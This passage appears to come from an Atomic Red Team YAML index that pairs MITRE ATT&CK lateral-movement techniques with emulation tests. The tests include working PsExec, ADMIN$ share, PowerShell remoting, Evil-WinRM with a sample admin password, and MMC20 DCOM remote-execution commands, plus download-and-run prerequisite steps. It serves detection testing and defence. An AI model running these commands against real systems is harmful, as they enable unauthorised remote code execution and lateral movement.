          description: File to copy and execute
          type: path
          default: C:\Windows\System32\cmd.exe
        remote_host:
          description: Remote computer to receive the copy and execute the file
          type: string
          default: "\\\\localhost"
        psexec_exe:
          description: Path to PsExec
          type: string
          default: C:\PSTools\PsExec.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'PsExec tool from Sysinternals must exist on disk at specified
          location (#{psexec_exe})

          '
        prereq_command: 'if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}

          '
        get_prereq_command: |
          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
          New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
      executor:
        command: "#{psexec_exe} #{remote_host} -accepteula -c #{command_path}\n"
        name: command_prompt
        elevation_required: true
    - name: Execute command writing output to local Admin Share
      auto_generated_guid: d41aaab5-bdfe-431d-a3d5-c29e9136ff46
      description: |
        Executes a command, writing the output to a local Admin Share.
        This technique is used by post-exploitation frameworks.
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: Remote computer to receive the copy and execute the file
          type: string
          default: output.txt
        command_to_execute:
          description: Command to execute for output.
          type: string
          default: hostname
      executor:
        command: 'cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file}
          2>&1

          '
        name: command_prompt
        elevation_required: true
  T1550:
    technique:
      x_mitre_platforms:
      - Windows
      - Office 365
      - SaaS
      - Google Workspace
      - IaaS
      - Containers
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814
      type: attack-pattern
      created: '2020-01-30T16:18:36.873Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1550
        url: https://attack.mitre.org/techniques/T1550
      - source_name: NIST Authentication
        url: https://csrc.nist.gov/glossary/term/authentication
        description: NIST. (n.d.). Authentication. Retrieved January 30, 2020.
      - source_name: NIST MFA
        url: https://csrc.nist.gov/glossary/term/Multi_Factor-Authentication
        description: NIST. (n.d.). Multi-Factor Authentication (MFA). Retrieved January
          30, 2020.
      - url: https://technet.microsoft.com/en-us/library/dn487457.aspx
        description: Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved
          June 3, 2016.
        source_name: TechNet Audit Policy
      modified: '2022-04-01T12:57:34.058Z'
      name: Use Alternate Authentication Material
      description: "Adversaries may use alternate authentication material, such as
        password hashes, Kerberos tickets, and application access tokens, in order
        to move laterally within an environment and bypass normal system access controls.
        \n\nAuthentication processes generally require a valid identity (e.g., username)
        along with one or more authentication factors (e.g., password, pin, physical
        smart card, token generator, etc.). Alternate authentication material is legitimately
        generated by systems after a user or application successfully authenticates
        by providing a valid identity and the required authentication factor(s). Alternate
        authentication material may also be generated during the identity creation
        process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate
        authentication material allows the system to verify an identity has successfully
        authenticated without asking the user to reenter authentication factor(s).
        Because the alternate authentication must be maintained by the systemâ€”either
        in memory or on diskâ€”it may be at risk of being stolen through [Credential
        Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate
        authentication material, adversaries are able to bypass system access controls
        and authenticate to systems without knowing the plaintext password or any
        additional authentication factors.\n"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: 'Configure robust, consistent account activity audit policies
        across the enterprise and with externally accessible services.(Citation: TechNet
        Audit Policy) Look for suspicious account behavior across systems that share
        accounts, either user, admin, or service accounts. Examples: one account logged
        into multiple systems simultaneously; multiple accounts logged into the same
        machine simultaneously; accounts logged in at odd times or outside of business
        hours. Activity may be from interactive login sessions or process ownership
        from accounts being used to execute binaries on a remote system as a particular
        account. Correlate other security systems with login information (e.g., a
        user has an active login session but has not entered the building or does
        not have VPN access).'
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Web Credential: Web Credential Usage'
      - 'Application Log: Application Log Content'
      - 'User Account: User Account Authentication'
      - 'Active Directory: Active Directory Credential Request'
      - 'Logon Session: Logon Session Creation'
      x_mitre_defense_bypassed:
      - System Access Controls
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1076:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Matthew Demaske, Adaptforward
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--51dea151-0898-4a45-967c-3ebee0420484
      type: attack-pattern
      created: '2017-05-31T21:30:59.769Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1076
        url: https://attack.mitre.org/techniques/T1076
      - external_id: CAPEC-555
        source_name: capec
        url: https://capec.mitre.org/data/definitions/555.html
      - url: https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx
        description: Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1,
          2016.
        source_name: TechNet Remote Desktop Services
      - url: http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/
        description: Alperovitch, D. (2014, October 31). Malware-Free Intrusions.
          Retrieved November 4, 2014.
        source_name: Alperovitch Malware
      - url: http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html
        description: Korznikov, A. (2017, March 17). Passwordless RDP Session Hijacking
          Feature All Windows versions. Retrieved December 11, 2017.
        source_name: RDP Hijacking Korznikov
      - url: https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6
        description: Beaumont, K. (2017, March 19). RDP hijackingâ€Šâ€”â€Šhow to hijack
          RDS and RemoteApp sessions transparently to move through an organisation.
          Retrieved December 11, 2017.
        source_name: RDP Hijacking Medium
      - url: https://github.com/nccgroup/redsnarf
        description: NCC Group PLC. (2016, November 1). Kali Redsnarf. Retrieved December
          11, 2017.
        source_name: Kali Redsnarf
      modified: '2020-02-11T18:24:04.507Z'
      name: Remote Desktop Protocol
      description: |-
        Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.

        Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)

        Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\windows\system32\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: |-
        Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.

        Also, set up process monitoring for <code>tscon.exe</code> usage and monitor service creation that uses <code>cmd.exe /k</code> or <code>cmd.exe /c</code> in its arguments to prevent RDP session hijacking.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - Remote Desktop Users
      - User
      x_mitre_system_requirements:
      - RDP service enabled, account in the Remote Desktop Users group.
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1021:
    technique:
      modified: '2023-03-30T21:01:42.821Z'
      name: Remote Services
      description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)
        to log into a service that accepts remote connections, such as telnet, SSH,
        and VNC. The adversary may then perform actions as the logged-on user.\n\nIn
        an enterprise environment, servers and workstations can be organized into
        domains. Domains provide centralized identity management, allowing users to
        login using one set of credentials across the entire network. If an adversary
        is able to obtain a set of valid domain credentials, they could login to many
        different machines using remote access protocols such as secure shell (SSH)
        or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet
        Remote Desktop Services) They could also login to accessible SaaS or IaaS
        services, such as those that federate their identities to the domain. \n\nLegitimate
        applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072)
        and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021)
        to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is
        native software used for remote management. ARD leverages a blend of protocols,
        including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the
        screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004)
        for secure file transfer.(Citation: Remote Management MDM macOS)(Citation:
        Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin
        Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code
        execution and perform lateral movement. In versions of macOS prior to 10.14,
        an adversary can escalate an SSH session to an ARD session which enables an
        adversary to accept TCC (Transparency, Consent, and Control) prompts without
        user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote
        Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop
        commands)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_contributors:
      - Dan Borges, @1njection
      x_mitre_deprecated: false
      x_mitre_detection: "Correlate use of login activity related to remote services
        with unusual behavior or other malicious or suspicious activity. Adversaries
        will likely need to learn about an environment and the relationships between
        systems through Discovery techniques prior to attempting Lateral Movement.
        \n\nUse of applications such as ARD may be legitimate depending on the environment
        and how itâ€™s used. Other factors, such as access patterns and activity that
        occurs after a remote login, may indicate suspicious or malicious behavior
        using these applications. Monitor for user accounts logged into systems they
        would not normally access or access patterns to multiple systems over a relatively
        short period of time. \n\nIn macOS, you can review logs for \"screensharingd\"
        and \"Authentication\" event messages. Monitor network connections regarding
        remote management (ports tcp:3283 and tcp:5900) and for remote login (port
        tcp:22).(Citation: Lockboxx ARD 2019)(Citation: Apple Unified Log Analysis
        Remote Login and Screen Sharing)"
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Logon Session: Logon Session Creation'
      - 'Network Traffic: Network Connection Creation'
      - 'Module: Module Load'
      - 'Network Traffic: Network Traffic Flow'
      - 'Command: Command Execution'
      - 'Network Share: Network Share Access'
      x_mitre_system_requirements:
      - Active remote service accepting connections and valid credentials
      type: attack-pattern
      id: attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba
      created: '2017-05-31T21:30:29.858Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1021
        external_id: T1021
      - source_name: Apple Remote Desktop Admin Guide 3.3
        description: Apple. (n.d.). Apple Remote Desktop Administrator Guide Version
          3.3. Retrieved October 5, 2021.
        url: https://images.apple.com/remotedesktop/pdf/ARD_Admin_Guide_v3.3.pdf
      - source_name: Remote Management MDM macOS
        description: Apple. (n.d.). Use MDM to enable Remote Management in macOS.
          Retrieved September 23, 2021.
        url: https://support.apple.com/en-us/HT209161
      - source_name: Kickstart Apple Remote Desktop commands
        description: Apple. (n.d.). Use the kickstart command-line utility in Apple
          Remote Desktop. Retrieved September 23, 2021.
        url: https://support.apple.com/en-us/HT201710
      - source_name: Lockboxx ARD 2019
        description: 'Dan Borges. (2019, July 21). MacOS Red Teaming 206: ARD (Apple
          Remote Desktop Protocol). Retrieved September 10, 2021.'
        url: http://lockboxx.blogspot.com/2019/07/macos-red-teaming-206-ard-apple-remote.html
      - source_name: FireEye 2019 Apple Remote Desktop
        description: 'Jake Nicastro, Willi Ballenthin. (2019, October 9). Living off
          the Orchard: Leveraging Apple Remote Desktop for Good and Evil. Retrieved
          August 16, 2021.'
        url: https://www.fireeye.com/blog/threat-research/2019/10/leveraging-apple-remote-desktop-for-good-and-evil.html
      - source_name: TechNet Remote Desktop Services
        description: Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1,
          2016.
        url: https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx
      - source_name: Apple Unified Log Analysis Remote Login and Screen Sharing
        description: 'Sarah Edwards. (2020, April 30). Analysis of Apple Unified Logs:
          Quarantine Edition [Entry 6] â€“ Working From Home? Remote Logins. Retrieved
          August 19, 2021.'
        url: https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins
      - source_name: SSH Secure Shell
        description: SSH.COM. (n.d.). SSH (Secure Shell). Retrieved March 23, 2020.
        url: https://www.ssh.com/ssh
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
    atomic_tests: []
  T1563:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--5b0ad6f8-6a16-4966-a4ef-d09ea6e2a9f5
      type: attack-pattern
      created: '2020-02-25T18:26:16.994Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1563
        url: https://attack.mitre.org/techniques/T1563
      - url: https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6
        description: Beaumont, K. (2017, March 19). RDP hijackingâ€Šâ€”â€Šhow to hijack
          RDS and RemoteApp sessions transparently to move through an organisation.
          Retrieved December 11, 2017.
        source_name: RDP Hijacking Medium
      - source_name: Breach Post-mortem SSH Hijack
        url: https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident
        description: Hodgson, M. (2019, May 8). Post-mortem and remediations for Apr
          11 security incident. Retrieved February 17, 2020.
      modified: '2020-03-23T23:35:58.129Z'
      name: Remote Service Session Hijacking
      description: |-
        Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.

        Adversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: |-
        Use of these services may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with that service. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.

        Monitor for processes and command-line arguments associated with hijacking service sessions.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      - 'Process: Process Creation'
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - SYSTEM
      - root
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1021.006:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65
      type: attack-pattern
      created: '2020-02-11T18:29:47.757Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1021.006
        url: https://attack.mitre.org/techniques/T1021/006
      - url: http://msdn.microsoft.com/en-us/library/aa384426
        description: Microsoft. (n.d.). Windows Remote Management. Retrieved November
          12, 2014.
        source_name: Microsoft WinRM
      - url: https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2
        description: Jacobsen, K. (2014, May 16). Lateral Movement with PowerShell&#91;slides&#93;.
          Retrieved November 12, 2014.
        source_name: Jacobsen 2014
      - url: https://msdn.microsoft.com/en-us/library/aa394582.aspx
        description: Microsoft. (n.d.). Windows Management Instrumentation. Retrieved
          April 27, 2016.
        source_name: MSDN WMI
      - source_name: Medium Detecting Lateral Movement
        url: https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc
        description: French, D. (2018, September 30). Detecting Lateral Movement Using
          Sysmon and Splunk. Retrieved October 11, 2019.
      modified: '2021-06-23T19:22:52.870Z'
      name: 'Remote Services: Windows Remote Management'
      description: |-
        Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

        WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: 'Monitor use of WinRM within an environment by tracking service
        execution. If it is not normally used or is disabled, then this may be an
        indicator of suspicious behavior.  Monitor processes created and actions taken
        by the WinRM process or a WinRM invoked script to correlate it with other
        related events.(Citation: Medium Detecting Lateral Movement) Also monitor
        for remote WMI connection attempts (typically over port 5985 when using HTTP
        and 5986 for HTTPS).'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Logon Session: Logon Session Creation'
      - 'Process: Process Creation'
      - 'Network Traffic: Network Connection Creation'
      - 'Service: Service Metadata'
      x_mitre_permissions_required:
      - User
      - Administrator
      identifier: T1021.006
    atomic_tests:
    - name: Enable Windows Remote Management
      auto_generated_guid: 9059e8de-3d7d-4954-a322-46161880b9cf
      description: |
        Powershell Enable WinRM

        Upon successful execution, powershell will "Enable-PSRemoting" allowing for remote PS access.
      supported_platforms:
      - windows
      executor:
        command: 'Enable-PSRemoting -Force

          '
        name: powershell
        elevation_required: true
    - name: Remote Code Execution with PS Credentials Using Invoke-Command
      auto_generated_guid: 5295bd61-bd7e-4744-9d52-85962a4cf2d6
      description: "Simulate lateral movement with PowerShell Remoting on the local
        host. \nUpon successful execution, PowerShell will execute `whoami` using
        `Invoke-Command`, targeting the \nlocal machine as remote target.\n"
      supported_platforms:
      - windows
      executor:
        command: |-
          Enable-PSRemoting -Force
          Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}
        cleanup_command: Disable-PSRemoting -Force
        name: powershell
    - name: WinRM Access with Evil-WinRM
      auto_generated_guid: efe86d95-44c4-4509-ae42-7bfd9d1f5b3d
      description: An adversary may attempt to use Evil-WinRM with a valid account
        to interact with remote systems that have WinRM enabled
      supported_platforms:
      - windows
      input_arguments:
        user_name:
          description: Username
          type: string
          default: Domain\Administrator
        destination_address:
          description: Remote Host IP or Hostname
          type: string
          default: Target
        password:
          description: Password
          type: string
          default: P@ssw0rd1
      dependency_executor_name: powershell
      dependencies:
      - description: Computer must have Ruby Installed
        prereq_command: try {if (ruby -v) {exit 0} else {exit 1}} catch {exit 1}
        get_prereq_command: |-
          Invoke-WebRequest  -OutFile $env:Temp\rubyinstaller-2.7.1-1-x64.exe https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe
          $file1= $env:Temp + "\rubyinstaller-2.7.1-1-x64.exe"
          Start-Process $file1 /S;
      - description: Computer must have Evil-WinRM installed
        prereq_command: try {if (evil-winrm -h) {exit 0} else {exit 1}} catch {exit
          1}
        get_prereq_command: gem install evil-winrm
      executor:
        command: 'evil-winrm -i #{destination_address} -u #{user_name} -p #{password}'
        name: powershell
        elevation_required: true
  T1021.003:
    technique:
      modified: '2023-04-03T18:58:54.034Z'
      name: 'Remote Services: Distributed Component Object Model'
      description: |-
        Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.

        The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)

        Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)

        Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017) Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.

        Monitor for any influxes or abnormal increases in DCOM related Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic (typically over port 135).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Network Traffic: Network Connection Creation'
      - 'Module: Module Load'
      type: attack-pattern
      id: attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd
      created: '2020-02-11T18:26:36.444Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1021/003
        external_id: T1021.003
      - source_name: Fireeye Hunting COM June 2019
        description: Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June
          10, 2019.
        url: https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html
      - source_name: Microsoft COM
        description: Microsoft. (n.d.). Component Object Model (COM). Retrieved November
          22, 2017.
        url: https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx
      - source_name: Microsoft COM ACL
        description: Microsoft. (n.d.). DCOM Security Enhancements in Windows XP Service
          Pack 2 and Windows Server 2003 Service Pack 1. Retrieved November 22, 2017.
        url: https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1
      - source_name: Microsoft Process Wide Com Keys
        description: Microsoft. (n.d.). Setting Process-Wide Security Through the
          Registry. Retrieved November 21, 2017.
        url: https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx
      - source_name: MSDN WMI
        description: Microsoft. (n.d.). Windows Management Instrumentation. Retrieved
          April 27, 2016.
        url: https://msdn.microsoft.com/en-us/library/aa394582.aspx
      - source_name: Enigma DCOM Lateral Movement Jan 2017
        description: 'Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round
          2. Retrieved November 21, 2017.'
        url: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
      - source_name: Enigma MMC20 COM Jan 2017
        description: Nelson, M. (2017, January 5). Lateral Movement using the MMC20
          Application COM Object. Retrieved November 21, 2017.
        url: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
      - source_name: Enigma Outlook DCOM Lateral Movement Nov 2017
        description: Nelson, M. (2017, November 16). Lateral Movement using Outlook's
          CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.
        url: https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/
      - source_name: Enigma Excel DCOM Sept 2017
        description: Nelson, M. (2017, September 11). Lateral Movement using Excel.Application
          and DCOM. Retrieved November 21, 2017.
        url: https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/
      - source_name: Cyberreason DCOM DDE Lateral Movement Nov 2017
        description: Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral
          movement via DCOM. Retrieved November 21, 2017.
        url: https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1021.003
    atomic_tests:
    - name: PowerShell Lateral Movement using MMC20
      auto_generated_guid: 6dc74eb1-c9d6-4c53-b3b5-6f50ae339673
      description: |
        Powershell lateral movement using the mmc20 application com object.

        Reference:

        https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/

        Upon successful execution, cmd will spawn calc.exe on a remote computer.
      supported_platforms:
      - windows
      input_arguments:
        computer_name:
          description: Name of Computer
          type: string
          default: localhost
      executor:
        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
          $null, $null, "7")

          '
        name: powershell
  T1175:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--772bc7a8-a157-42cc-8728-d648e25c7fe7
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        external_id: T1175
        url: https://attack.mitre.org/techniques/T1175
      - source_name: Fireeye Hunting COM June 2019
        url: https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html
        description: Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June
          10, 2019.
      - url: https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx
        description: Microsoft. (n.d.). Component Object Model (COM). Retrieved November
          22, 2017.
        source_name: Microsoft COM
      - url: https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1
        description: Microsoft. (n.d.). DCOM Security Enhancements in Windows XP Service
          Pack 2 and Windows Server 2003 Service Pack 1. Retrieved November 22, 2017.
        source_name: Microsoft COM ACL
      - url: https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx
        description: Microsoft. (n.d.). Setting Process-Wide Security Through the
          Registry. Retrieved November 21, 2017.
        source_name: Microsoft Process Wide Com Keys
      - url: https://msdn.microsoft.com/en-us/library/windows/desktop/ms694331(v=vs.85).aspx
        description: Microsoft. (n.d.). Registry Values for System-Wide Security.
          Retrieved November 21, 2017.
        source_name: Microsoft System Wide Com Keys
      - url: https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html
        description: 'Forshaw, J. (2018, April 18). Windows Exploitation Tricks: Exploiting
          Arbitrary File Writes for Local Elevation of Privilege. Retrieved May 3,
          2018.'
        source_name: ProjectZero File Write EoP Apr 2018
